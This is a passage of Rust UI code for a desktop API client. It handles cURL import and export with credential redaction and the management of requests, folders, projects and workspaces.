        let has_session_auth = !matches!(parsed.auth, Auth::None);
        self.editing_request_name = false;
        self.suppress_dirty = true;
        self.populate_editor_from_request(parsed, true, window, cx);
        self.suppress_dirty = false;
        self.refresh_kv_counts(cx);
        self.refresh_body_json_valid(cx);
        self.mark_dirty(cx);

        let msg = notice.unwrap_or_else(|| {
            if has_session_auth {
                format!("Parsed cURL into request: {method} {url} (Auth kept session-only)")
            } else {
                format!("Parsed cURL into request: {method} {url}")
            }
        });
        self.set_status(msg.clone(), false, cx);
        window.push_notification(Notification::success(msg), cx);
    }

    fn apply_confirmed_curl_view(
        &mut self,
        confirm_view: &Entity<CurlImportConfirmView>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let (mut req, has_findings, choice, unsupported) = {
            let state = confirm_view.read(cx);
            (
                state.report.request.clone(),
                state.findings_count > 0,
                state.choice,
                state.report.unsupported_flags.clone(),
            )
        };
        let summary = (has_findings && choice == 0).then(|| sanitize_request_credentials(&mut req));
        let notice = Self::format_curl_apply_notice(&req, summary, &unsupported);
        self.apply_curl_request_to_editor(req, Some(notice), window, cx);
    }

    fn format_curl_apply_notice(
        req: &ApiRequest,
        summary: Option<fastman_core::security::SanitizeSummary>,
        unsupported: &[String],
    ) -> String {
        let mut msg = match summary {
            Some(s) => format!(
                "Parsed cURL into request (moved {} to session Auth, stripped {})",
                s.moved_to_session_auth, s.stripped_fields
            ),
            None if !matches!(req.auth, Auth::None) => format!(
                "Parsed cURL into request: {} {} (Auth kept session-only)",
                req.method, req.url
            ),
            None => format!("Parsed cURL into request: {} {}", req.method, req.url),
        };
        if !unsupported.is_empty() {
            msg.push_str(&format!(" · ignored flags: {}", unsupported.join(", ")));
        }
        msg
    }

    fn open_curl_import_confirm_dialog(
        &mut self,
        report: curl::CurlParseReport,
        replace_summary: Option<String>,
        findings: Vec<SensitiveFieldFinding>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let title = if !findings.is_empty() {
            "Confirm Sensitive Credential Handling"
        } else if replace_summary.is_some() {
            "Replace Current Request?"
        } else {
            "Confirm cURL Import"
        };
        let ok_text = if replace_summary.is_some() {
            "Replace Request"
        } else {
            "Apply cURL"
        };
        let confirm_view = cx.new(|_| CurlImportConfirmView {
            report,
            replace_summary,
            findings_count: findings.len(),
            findings_summary: summarize_sensitive_findings(&findings),
            choice: 0,
        });
        self.active_curl_confirm = Some(confirm_view.downgrade());
        let weak_workspace = cx.weak_entity();
        window.open_dialog(cx, move |dialog, _, _| {
            let confirm_ok = confirm_view.clone();
            let weak_ok = weak_workspace.clone();
            dialog
                .w(px(580.))
                .title(title)
                .button_props(
                    DialogButtonProps::default()
                        .ok_text(ok_text)
                        .show_cancel(true),
                )
                .on_ok(move |_, window, cx| {
                    let _ = weak_ok.update(cx, |view, cx| {
                        view.apply_confirmed_curl_view(&confirm_ok, window, cx);
                    });
                    true
                })
                .child(confirm_view.clone())
        });
    }

    fn try_apply_curl_from_url_bar(
        &mut self,
        raw: &str,
        prior_url: String,
        prior_dirty: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if raw.len() > curl::MAX_CURL_IMPORT_BYTES {
            self.restore_url_state(prior_url, prior_dirty, window, cx);
            let msg = format!(
                "cURL command exceeds maximum size ({} bytes).",
                curl::MAX_CURL_IMPORT_BYTES
            );
            self.set_status(msg.clone(), true, cx);
            window.push_notification(Notification::error(msg), cx);
            return;
        }
        let replace_summary = self.describe_draft_replacement(&prior_url, prior_dirty, cx);
        match curl::parse_curl_report(raw) {
            Ok(report) => {
                let mut findings = Vec::new();
                collect_sensitive_request_findings(&report.request, &mut findings);
                if replace_summary.is_some()
                    || !findings.is_empty()
                    || !report.unsupported_flags.is_empty()
                {
                    // Never stage raw pasted cURL commands/secrets inside the editable draft.
                    self.restore_url_state(prior_url, prior_dirty, window, cx);
                    self.open_curl_import_confirm_dialog(
                        report,
                        replace_summary,
                        findings,
                        window,
                        cx,
                    );
                } else {
                    self.apply_curl_request_to_editor(report.request, None, window, cx);
                }
            }
            Err(err) => {
                self.restore_url_state(prior_url, prior_dirty, window, cx);
                let msg = format!("cURL parse failed: {err:#}");
                self.set_status(msg.clone(), true, cx);
                window.push_notification(Notification::error(msg), cx);
            }
        }
    }

    fn load_editor(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        self.active_curl_confirm = None;
        self.editing_request_name = false;
        self.suppress_dirty = true;
        let request = self.current_request().cloned();
        if let Some(request) = request {
            self.populate_editor_from_request(request, false, window, cx);
        } else {
            self.method = "GET".into();
            self.auth_kind = 0;
            self.body_kind = 0;
            self.last_url.clear();
            for field in [
                &self.url,
                &self.request_name,
                &self.auth_user,
                &self.auth_password,
                &self.auth_token,
                &self.api_key_name,
                &self.api_key_value,
            ] {
                Self::set_input(field, "", window, cx);
            }
            Self::set_editor(&self.body_editor, "", window, cx);
            self.params_table
                .load(&[], window, cx, Self::kv_change_handler(0));
            self.headers_table
                .load(&[], window, cx, Self::kv_change_handler(1));
            self.form_table
                .load(&[], window, cx, Self::kv_change_handler(2));
            Self::set_input(&self.timeout, "30000", window, cx);
        }
        self.suppress_dirty = false;
        self.dirty = false;
        self.refresh_kv_counts(cx);
        self.refresh_body_json_valid(cx);
        self.refresh_template_inspection(cx);
        self.refresh_response_search_matches(cx);
        self.reset_response_scroll();
        cx.notify();
    }

    fn apply_editor(&mut self, cx: &mut Context<Self>) -> Result<()> {
        let Some(id) = self.selected_id.as_deref() else {
            return Ok(());
        };
        let draft = self.read_request_draft(cx)?;
        if let Some(request) = self.projects[self.active_project].find_request_mut(id) {
            draft.apply_to(request);
        }
        Ok(())
    }

    fn save(&mut self, cx: &mut Context<Self>) -> Result<()> {
        self.apply_editor(cx)?;
        self.store.save(self.current())?;
        self.dirty = false;
        self.set_status("Saved locally", false, cx);
        Ok(())
    }

    fn save_if_dirty(&mut self, cx: &mut Context<Self>) -> Result<()> {
        if !self.dirty {
            return Ok(());
        }
        self.save(cx)
    }

    fn cache_response(&mut self, request_id: String, entry: ResponseCacheEntry) {
        self.response_order.retain(|id| id != &request_id);
        self.response_order.push_back(request_id.clone());
        self.responses.insert(request_id, entry);

        let mut total_bytes: usize = self.responses.values().map(|e| e.approx_bytes).sum();
        while (self.responses.len() > MAX_CACHED_RESPONSES || total_bytes > MAX_TOTAL_CACHE_BYTES)
            && self.responses.len() > 1
        {
            let Some(oldest_id) = self.response_order.pop_front() else {
                break;
            };
            if let Some(removed) = self.responses.remove(&oldest_id) {
                total_bytes = total_bytes.saturating_sub(removed.approx_bytes);
            }
        }
    }

    fn prune_responses_to_current_project(&mut self) {
        let current = self.current().clone();
        self.responses
            .retain(|id, _| current.find_request(id).is_some());
        self.response_order
            .retain(|id| self.responses.contains_key(id));
    }

    pub(super) fn save_with_toast(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        match self.save(cx) {
            Ok(()) => {
                window.push_notification(Notification::success("Request saved locally"), cx);
            }
            Err(error) => {
                let msg = format!("Save failed: {error:#}");
                self.set_status(msg.clone(), true, cx);
                window.push_notification(Notification::error(msg), cx);
            }
        }
    }

    pub(super) fn toggle_rename_request(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.editing_request_name {
            match self.save(cx) {
                Ok(()) => self.editing_request_name = false,
                Err(error) => {
                    let msg = format!("Cannot rename: {error:#}");
                    self.set_status(msg.clone(), true, cx);
                    window.push_notification(Notification::error(msg), cx);
                }
            }
        } else {
            self.editing_request_name = true;
            self.request_name
                .read(cx)
                .focus_handle(cx)
                .focus(window, cx);
        }
        cx.notify();
    }

    pub(super) fn open_request(&mut self, id: String, window: &mut Window, cx: &mut Context<Self>) {
        if self.selected_id.as_ref() == Some(&id) {
            return;
        }
        if let Err(error) = self.save_if_dirty(cx) {
            let msg = format!("Cannot switch tab: {error:#}");
            self.set_status(msg.clone(), true, cx);
            window.push_notification(Notification::error(msg), cx);
            return;
        }
        self.cancel(cx);
        self.selected_id = Some(id.clone());
        if !self.open_tabs.contains(&id) {
            self.open_tabs.push(id);
        }
        self.load_editor(window, cx);
    }

    pub(super) fn close_tab(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        if self.selected_id.as_deref() == Some(id) {
            if let Err(error) = self.save_if_dirty(cx) {
                let msg = format!("Cannot close tab: {error:#}");
                self.set_status(msg.clone(), true, cx);
                window.push_notification(Notification::error(msg), cx);
                return;
            }
            self.cancel(cx);
        }
        self.open_tabs.retain(|tab| tab != id);
        if self.selected_id.as_deref() == Some(id) {
            self.selected_id = self.open_tabs.last().cloned();
            self.load_editor(window, cx);
        }
        cx.notify();
    }

    pub(super) fn switch_project(
        &mut self,
        index: usize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if index == self.active_project || index >= self.projects.len() {
            return;
        }
        if let Err(error) = self.save_if_dirty(cx) {
            let msg = format!("Cannot switch project: {error:#}");
            self.set_status(msg.clone(), true, cx);
            window.push_notification(Notification::error(msg), cx);
            return;
        }
        self.cancel(cx);
        self.active_project = index;
        if self
            .project_selector
            .read(cx)
            .selected_index(cx)
            .map(|p| p.row)
            != Some(index)
        {
            self.project_selector.update(cx, |sel, cx| {
                sel.set_selected_index(Some(IndexPath::default().row(index)), window, cx);
            });
        }
        self.selected_id = self.current().first_request_id();
        self.open_tabs = self.selected_id.clone().into_iter().collect();
        self.target_folder = None;
        self.prune_responses_to_current_project();
        self.refresh_request_count();
        self.expand_all();
        self.load_editor(window, cx);
        self.set_status(format!("Project: {}", self.current().name), false, cx);
    }

    pub(super) fn focus_folder_from_palette(
        &mut self,
        id: String,
        ancestor_ids: Vec<String>,
        cx: &mut Context<Self>,
    ) {
        for ancestor in ancestor_ids {
            self.expanded.insert(ancestor);
        }
        self.expanded.insert(id.clone());
        self.target_folder = Some(id);
        cx.notify();
    }

    pub(super) fn switch_workspace(
        &mut self,
        index: usize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if index == self.active_workspace || index >= self.workspaces.len() {
            return;
        }
        let result = (|| -> Result<(ProjectStore, Vec<Project>, Vec<String>)> {
            self.save_if_dirty(cx)?;
            let store = self
                .workspace_store
                .for_workspace(&self.workspaces[index].id)?;
            let (mut projects, warnings) = store.list_resilient()?;
            if projects.is_empty() {
                projects.push(store.create("Project 1")?);
            }
            Ok((store, projects, warnings))
        })();
        match result {
            Ok((store, projects, warnings)) => {
                self.cancel(cx);
                self.responses.clear();
                self.response_order.clear();
                self.store = store;
                self.projects = projects;
                self.active_workspace = index;
                self.active_project = 0;
                self.target_folder = None;
                self.selected_id = self.current().first_request_id();
                self.open_tabs = self.selected_id.clone().into_iter().collect();
                let choices = project_choices(&self.projects);
                self.project_selector.update(cx, |selector, cx| {
                    selector.set_items(choices, window, cx);
                    selector.set_selected_index(Some(IndexPath::default()), window, cx);
                });
                self.refresh_request_count();
                self.expand_all();
                self.load_editor(window, cx);
                if warnings.is_empty() {
                    self.set_status(
                        format!("Workspace: {}", self.workspaces[index].name),
                        false,
                        cx,
                    );
                } else {
                    let msg = warnings.join("; ");
                    self.set_status(format!("Loaded with warnings: {msg}"), true, cx);
                    window.push_notification(Notification::warning(msg), cx);
                }
            }
            Err(error) => {
                let msg = format!("Cannot switch workspace: {error:#}");
                self.set_status(msg.clone(), true, cx);
                window.push_notification(Notification::error(msg), cx);
            }
        }
    }

    pub(super) fn add_folder(&mut self, cx: &mut Context<Self>) {
        let folder = Folder::new("New Folder");
        let id = folder.id.clone();
        if let Some(target) = self.target_folder.clone()
            && self.projects[self.active_project].add_subfolder(&target, folder.clone())
        {
            self.expanded.insert(target);
            self.expanded.insert(id.clone());
            self.target_folder = Some(id);
            if let Err(err) = self.save(cx) {
                self.set_status(format!("Save failed: {err:#}"), true, cx);
            }
            return;
        }
        if self.projects[self.active_project].collections.is_empty() {
            self.projects[self.active_project]
                .collections
                .push(Collection::new("Default Collection"));
        }
        if let Some(collection) = self.projects[self.active_project].collections.first_mut() {
            collection.folders.push(folder);
            self.expanded.insert(collection.id.clone());
            self.expanded.insert(id.clone());
            self.target_folder = Some(id);
            if let Err(err) = self.save(cx) {
                self.set_status(format!("Save failed: {err:#}"), true, cx);
            }
        }
    }

    pub(super) fn add_subfolder(&mut self, parent_id: &str, cx: &mut Context<Self>) {
        let folder = Folder::new("New Folder");
        let id = folder.id.clone();
        if self.projects[self.active_project].add_subfolder(parent_id, folder) {
            self.expanded.insert(parent_id.to_owned());
            self.expanded.insert(id.clone());
            self.target_folder = Some(id);
            if let Err(err) = self.save(cx) {
                self.set_status(format!("Save failed: {err:#}"), true, cx);
            }
        }
    }

    pub(super) fn add_request(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let request = ApiRequest::new("GET", "New Request", "");
        self.insert_and_open_request(request, window, cx);
    }

    fn insert_and_open_request(
        &mut self,
        request: ApiRequest,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if let Err(error) = self.save_if_dirty(cx) {
            let msg = format!("Cannot save active request: {error:#}");
            self.set_status(msg.clone(), true, cx);
            window.push_notification(Notification::error(msg), cx);
            return;
        }
        let id = request.id.clone();
        let mut pending = Some(request);
        if let Some(target) = self.target_folder.as_deref() {
            for collection in &mut self.projects[self.active_project].collections {
                if let Some(folder) = collection.find_folder_mut(target)
                    && let Some(req) = pending.take()
                {
                    folder.requests.push(req);
                    self.expanded.insert(target.to_owned());
                    break;
                }
            }
        }
        if let Some(req) = pending {
            if self.projects[self.active_project].collections.is_empty() {
                self.projects[self.active_project]
                    .collections
                    .push(Collection::new("Default Collection"));
            }
            let coll = &mut self.projects[self.active_project].collections[0];
            self.expanded.insert(coll.id.clone());
            coll.requests.push(req);
        }
        self.refresh_request_count();
        match self.store.save(self.current()) {
            Ok(()) => self.open_request(id, window, cx),
            Err(error) => {
                let msg = format!("Create request failed: {error:#}");
                self.set_status(msg.clone(), true, cx);
                window.push_notification(Notification::error(msg), cx);
            }
        }
    }

    pub(super) fn duplicate_request(
        &mut self,
        id: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if let Err(error) = self.save_if_dirty(cx) {
            window.push_notification(Notification::error(format!("Save failed: {error:#}")), cx);
            return;
        }
        if let Some(new_id) = self.projects[self.active_project].duplicate_request(id) {
            self.refresh_request_count();
            if let Err(error) = self.store.save(self.current()) {
                let msg = format!("Save failed: {error:#}");
                self.set_status(msg.clone(), true, cx);
                window.push_notification(Notification::error(msg), cx);
                return;
            }
            self.open_request(new_id, window, cx);
            window.push_notification(Notification::success("Request duplicated"), cx);
        }
    }

    fn apply_editor_for_tree_move(&mut self, window: &mut Window, cx: &mut Context<Self>) -> bool {
        if let Err(error) = self.apply_editor(cx) {
            let msg = format!("Cannot apply editor changes: {error:#}");
            self.set_status(msg.clone(), true, cx);
            window.push_notification(Notification::error(msg), cx);
            return false;
        }
        true
    }

    fn persist_tree_change(
        &mut self,
        status: impl Into<SharedString>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        match self.store.save(self.current()) {
            Ok(()) => {
                self.dirty = false;
                self.set_status(status, false, cx);
            }
            Err(error) => {
                self.dirty = true;
                let msg = format!("Save failed: {error:#}");
                self.set_status(msg.clone(), true, cx);
                window.push_notification(Notification::error(msg), cx);
            }
        }
        cx.notify();
    }

    pub(super) fn move_request_offset(
        &mut self,
        request_id: &str,
        delta: isize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_request_offset(request_id, delta) {
            self.persist_tree_change("Request order updated", window, cx);
        }
    }

    pub(super) fn move_request_to_folder(
        &mut self,
        request_id: &str,
        target_folder_id: Option<&str>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_request_to_folder(request_id, target_folder_id) {
            if let Some(folder_id) = target_folder_id {
                self.expanded.insert(folder_id.to_owned());
            }
            let status = match target_folder_id
                .and_then(|id| self.current().find_folder(id))
                .map(|f| f.name.as_str())
            {
                Some(name) => format!("Moved request to '{name}'"),
                None => "Moved request to root".into(),
            };
            self.persist_tree_change(status, window, cx);
        }
    }

    pub(super) fn move_request_to_collection(
        &mut self,
        request_id: &str,
        collection_id: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_request_to_collection(request_id, collection_id)
        {
            self.expanded.insert(collection_id.to_owned());
            self.persist_tree_change("Moved request to root", window, cx);
        }
    }

    pub(super) fn move_request_relative(
        &mut self,
        request_id: &str,
        target_request_id: &str,
        after: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_request_relative(
            request_id,
            target_request_id,
            after,
        ) {
            if let Some(folder_id) = self.current().request_parent_folder(target_request_id) {
                self.expanded.insert(folder_id);
            }
            self.persist_tree_change("Request moved", window, cx);
        }
    }

    #[allow(dead_code)]
    pub(super) fn move_request_to_target(
        &mut self,
        request_id: &str,
        target_request_id: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_request_to_target(request_id, target_request_id)
        {
            if let Some(folder_id) = self.current().request_parent_folder(target_request_id) {
                self.expanded.insert(folder_id);
            }
            self.persist_tree_change("Request moved", window, cx);
        }
    }

    pub(super) fn move_folder_offset(
        &mut self,
        folder_id: &str,
        delta: isize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_folder_offset(folder_id, delta) {
            self.persist_tree_change("Folder order updated", window, cx);
        }
    }

    pub(super) fn move_folder_to_folder(
        &mut self,
        folder_id: &str,
        target_folder_id: Option<&str>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_folder_to_folder(folder_id, target_folder_id) {
            if let Some(target_id) = target_folder_id {
                self.expanded.insert(target_id.to_owned());
            }
            let status = match target_folder_id
                .and_then(|id| self.current().find_folder(id))
                .map(|f| f.name.as_str())
            {
                Some(name) => format!("Moved folder to '{name}'"),
                None => "Moved folder to root".into(),
            };
            self.persist_tree_change(status, window, cx);
        }
    }

    pub(super) fn move_folder_to_collection(
        &mut self,
        folder_id: &str,
        collection_id: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_folder_to_collection(folder_id, collection_id) {
            self.expanded.insert(collection_id.to_owned());
            self.persist_tree_change("Moved folder to root", window, cx);
        }
    }

    pub(super) fn move_collection_offset(
        &mut self,
        collection_id: &str,
        delta: isize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_collection_offset(collection_id, delta) {
            self.persist_tree_change("Collection order updated", window, cx);
        }
    }

    pub(super) fn move_folder_relative(
        &mut self,
        folder_id: &str,
        target_folder_id: &str,
        after: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_folder_relative(
            folder_id,
            target_folder_id,
            after,
        ) {
            if let Some(parent_id) = self.current().folder_parent_folder(target_folder_id) {
                self.expanded.insert(parent_id);
            }
            self.persist_tree_change("Folder moved", window, cx);
        }
    }

    pub(super) fn copy_request_as_curl(
        &mut self,
        target_id: Option<&str>,
        force_full: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if (target_id.is_none() || target_id == self.selected_id.as_deref())
            && let Err(error) = self.apply_editor(cx)
        {
            let msg = format!("Cannot export cURL: {error:#}");
            self.set_status(msg.clone(), true, cx);
            window.push_notification(Notification::error(msg), cx);
            return;
        }
        let lookup_id = target_id.or(self.selected_id.as_deref());
        let Some(req) = lookup_id.and_then(|id| self.current().find_request(id)) else {
            return;
        };
        let export = match curl::to_curl_export(req, &self.current().variables, !force_full) {
            Ok(export) => export,
            Err(error) => {
                let msg = format!("Cannot export cURL: {error:#}");
                self.set_status(msg.clone(), true, cx);
                window.push_notification(Notification::error(msg), cx);
                return;
            }
        };
        if !force_full {
            cx.write_to_clipboard(ClipboardItem::new_string(export.command));
            if export.had_secrets || export.had_variables {
                self.set_status("Copied redacted cURL to clipboard", false, cx);
                window.push_notification(
                    Notification::warning(
                        "Copied redacted cURL (secrets & variables hidden). Use 'Copy Full cURL' to include credentials.",
                    ),
                    cx,
                );
            } else {
                self.set_status("Copied cURL command to clipboard", false, cx);
                window.push_notification(Notification::success("Copied as cURL command"), cx);
            }
            return;
        }

        if !export.had_secrets && !export.had_variables {
            cx.write_to_clipboard(ClipboardItem::new_string(export.command));
            self.set_status("Copied cURL command to clipboard", false, cx);
            window.push_notification(Notification::success("Copied as cURL command"), cx);
            return;
        }

        let full_cmd = export.command;
        let weak_view = cx.weak_entity();
        window.open_dialog(cx, move |dialog, _, _| {
            let cmd = full_cmd.clone();
            let weak_ok = weak_view.clone();
            dialog
                .w(px(460.))
                .title("Clipboard Security Warning")
                .button_props(
                    DialogButtonProps::default()
                        .ok_text("Copy Full cURL")
                        .ok_variant(ButtonVariant::Danger)
                        .show_cancel(true),
                )
                .on_ok(move |_, window, cx| {
                    cx.write_to_clipboard(ClipboardItem::new_string(cmd.clone()));
                    let _ = weak_ok.update(cx, |view, cx| {
                        view.set_status("Copied full cURL (with credentials) to clipboard", false, cx);
                    });
                    window.push_notification(
                        Notification::warning("Full cURL with credentials copied to clipboard"),
                        cx,
                    );
                    true
                })
                .child(
                    Alert::warning(
                        "curl-clipboard-warning",
                        "This command includes plaintext authentication headers, keys, or expanded project variables. Clipboard managers and other local apps may retain or read it.",
                    )
                    .title("Copy unredacted credentials to clipboard?"),
                )
        });
    }

    pub(super) fn open_name_dialog(
        &mut self,
        kind: NameDialogKind,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let (title, placeholder, initial, ok_text) = match &kind {
            NameDialogKind::NewWorkspace => (
                "Create Workspace",
                "Workspace name",
                String::new(),
                "Create",
            ),
            NameDialogKind::NewProject => {
                ("Create Project", "Project name", String::new(), "Create")
            }
            NameDialogKind::RenameFolder(folder_id) => {
                let current_name = self
                    .current()
                    .find_folder(folder_id)
                    .map(|f| f.name.clone())
                    .unwrap_or_default();
                ("Rename Folder", "Folder name", current_name, "Rename")
            }
            NameDialogKind::RenameCollection(collection_id) => {
                let current_name = self
                    .current()
                    .find_collection(collection_id)
                    .map(|c| c.name.clone())
                    .unwrap_or_default();
                (
                    "Rename Collection",
                    "Collection name",
                    current_name,
                    "Rename",
                )
            }
        };

        let input = cx.new(|cx| {
            InputState::new(window, cx)
                .placeholder(placeholder)
                .default_value(initial)
        });
        let initial_focus = Cell::new(true);
        let weak_view = cx.weak_entity();
        let kind_ok = kind.clone();

        window.open_dialog(cx, move |dialog, window, cx| {
            if initial_focus.replace(false) {
                input.read(cx).focus_handle(cx).focus(window, cx);
            }
            let input_ok = input.clone();
            let weak_ok = weak_view.clone();
            let kind_exec = kind_ok.clone();
            dialog
                .w(px(400.))
                .title(title)
                .button_props(
                    DialogButtonProps::default()
                        .ok_text(ok_text)
                        .show_cancel(true),
                )
                .on_ok(move |_, window, cx| {
                    let value = input_ok.read(cx).value().trim().to_string();
                    if value.is_empty() {
                        window.push_notification(Notification::warning("Name cannot be empty"), cx);
                        return false;
                    }
                    let mut ok = true;
                    let _ = weak_ok.update(cx, |view, cx| match &kind_exec {
                        NameDialogKind::NewWorkspace => {
                            match view.workspace_store.create_workspace(&value) {
                                Ok(ws) => {
                                    view.workspaces.push(ws);
                                    let idx = view.workspaces.len() - 1;
                                    view.switch_workspace(idx, window, cx);
                                    window.push_notification(
                                        Notification::success(format!(
                                            "Workspace '{value}' created"
                                        )),
                                        cx,
                                    );
                                }
                                Err(err) => {
                                    ok = false;
                                    window.push_notification(
                                        Notification::error(format!("Workspace failed: {err:#}")),
                                        cx,
                                    );
                                }
                            }
                        }
                        NameDialogKind::NewProject => {
                            if let Err(err) = view.save_if_dirty(cx) {
                                ok = false;
                                window.push_notification(
                                    Notification::error(format!("Save failed: {err:#}")),
                                    cx,
                                );
                                return;
                            }
                            match view.store.create(&value) {
                                Ok(project) => {
                                    view.projects.push(project);
                                    let last = view.projects.len() - 1;
                                    let choices = project_choices(&view.projects);
                                    view.project_selector.update(cx, |sel, cx| {
                                        sel.set_items(choices, window, cx);
                                        sel.set_selected_index(
                                            Some(IndexPath::default().row(last)),
                                            window,
                                            cx,
                                        );
                                    });
                                    view.switch_project(last, window, cx);
                                    window.push_notification(
                                        Notification::success(format!("Project '{value}' created")),
                                        cx,
                                    );
                                }
                                Err(err) => {
                                    ok = false;
                                    window.push_notification(
                                        Notification::error(format!("Project failed: {err:#}")),
                                        cx,
                                    );
                                }
                            }
                        }
                        NameDialogKind::RenameFolder(folder_id) => {
                            if view.projects[view.active_project]
                                .rename_folder(folder_id, value.clone())
                            {
                                match view.save(cx) {
                                    Ok(()) => window.push_notification(
                                        Notification::success("Folder renamed"),
                                        cx,
                                    ),
                                    Err(err) => {
                                        ok = false;
                                        window.push_notification(
                                            Notification::error(format!("Rename failed: {err:#}")),
                                            cx,
                                        );
                                    }
                                }
                            }
                        }
                        NameDialogKind::RenameCollection(collection_id) => {
                            if view.projects[view.active_project]
                                .rename_collection(collection_id, value.clone())
                            {
                                match view.save(cx) {
                                    Ok(()) => window.push_notification(
                                        Notification::success("Collection renamed"),
                                        cx,
                                    ),
                                    Err(err) => {
                                        ok = false;
                                        window.push_notification(
                                            Notification::error(format!("Rename failed: {err:#}")),
                                            cx,
                                        );
                                    }
                                }
                            }
                        }
                    });
                    ok
                })
                .child(Input::new(&input).small())
        });
    }

    pub(super) fn confirm_delete_request(
        &mut self,
        id: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let name = self
            .current()
            .find_request(&id)
            .map(|r| r.name.clone())
            .unwrap_or_else(|| "this request".into());
        let weak_view = cx.weak_entity();
        window.open_dialog(cx, move |dialog, _, _| {
            let weak_ok = weak_view.clone();
            let req_id = id.clone();
            dialog
                .w(px(400.))
                .title("Delete Request")
                .button_props(
                    DialogButtonProps::default()
                        .ok_text("Delete")
                        .ok_variant(ButtonVariant::Danger)
                        .show_cancel(true),
                )
                .on_ok(move |_, window, cx| {
                    let _ = weak_ok.update(cx, |view, cx| {
                        view.delete_request_now(&req_id, window, cx);
                    });
                    true
                })
                .child(div().text_size(px(13.)).child(format!(
                    "Delete \"{name}\" from this project? This cannot be undone."
                )))
        });
    }

    fn delete_request_now(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        if self.selected_id.as_deref() == Some(id) {
            self.cancel(cx);
        }
        if self.projects[self.active_project].delete_request(id) {
            self.responses.remove(id);
            self.response_order.retain(|item| item != id);
            self.open_tabs.retain(|tab| tab != id);
            self.refresh_request_count();
            if self.selected_id.as_deref() == Some(id) {
                self.selected_id = self
                    .open_tabs
                    .last()
                    .cloned()
                    .or_else(|| self.current().first_request_id());
                if let Some(next_id) = &self.selected_id
                    && !self.open_tabs.contains(next_id)
                {
                    self.open_tabs.push(next_id.clone());
                }
                self.load_editor(window, cx);
            }
            match self.store.save(self.current()) {
                Ok(()) => {
                    self.set_status("Request deleted", false, cx);
                    window.push_notification(Notification::success("Request deleted"), cx);
                }
                Err(error) => {
                    let msg = format!("Save failed: {error:#}");
                    self.set_status(msg.clone(), true, cx);
                    window.push_notification(Notification::error(msg), cx);
                }
            }
        }
    }

    pub(super) fn confirm_delete_folder(
        &mut self,
        id: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let name = self
            .current()
            .find_folder(&id)
            .map(|f| f.name.clone())
            .unwrap_or_else(|| "this folder".into());
        let weak_view = cx.weak_entity();
        window.open_dialog(cx, move |dialog, _, _| {
            let weak_ok = weak_view.clone();
            let folder_id = id.clone();
            dialog
                .w(px(420.))
                .title("Delete Folder")
                .button_props(
                    DialogButtonProps::default()
                        .ok_text("Delete Folder")
                        .ok_variant(ButtonVariant::Danger)
                        .show_cancel(true),
                )
                .on_ok(move |_, window, cx| {
                    let _ = weak_ok.update(cx, |view, cx| {
                        view.delete_folder_now(&folder_id, window, cx);
                    });
                    true
                })
                .child(div().text_size(px(13.)).child(format!(
                    "Delete folder \"{name}\" and all requests inside it? This cannot be undone."
                )))
        });
    }

    fn reconcile_after_container_delete(
        &mut self,
        status: &'static str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.refresh_request_count();
        if self
            .target_folder
            .as_deref()
            .is_some_and(|tf| self.current().find_folder(tf).is_none())
        {
            self.target_folder = None;
        }
        self.prune_responses_to_current_project();
        let current = self.current().clone();
        self.open_tabs
            .retain(|tab| current.find_request(tab).is_some());
        if self
            .selected_id
            .as_deref()
            .is_some_and(|sel| current.find_request(sel).is_none())
        {
            self.cancel(cx);
            self.selected_id = self
                .open_tabs
                .last()
                .cloned()
                .or_else(|| current.first_request_id());
            if let Some(next_id) = &self.selected_id
                && !self.open_tabs.contains(next_id)
            {
                self.open_tabs.push(next_id.clone());
            }
            self.load_editor(window, cx);
        }
        match self.store.save(self.current()) {
            Ok(()) => {
                self.set_status(status, false, cx);
                window.push_notification(Notification::success(status), cx);
            }
            Err(error) => {
                let msg = format!("Save failed: {error:#}");
                self.set_status(msg.clone(), true, cx);
                window.push_notification(Notification::error(msg), cx);
            }
        }
    }

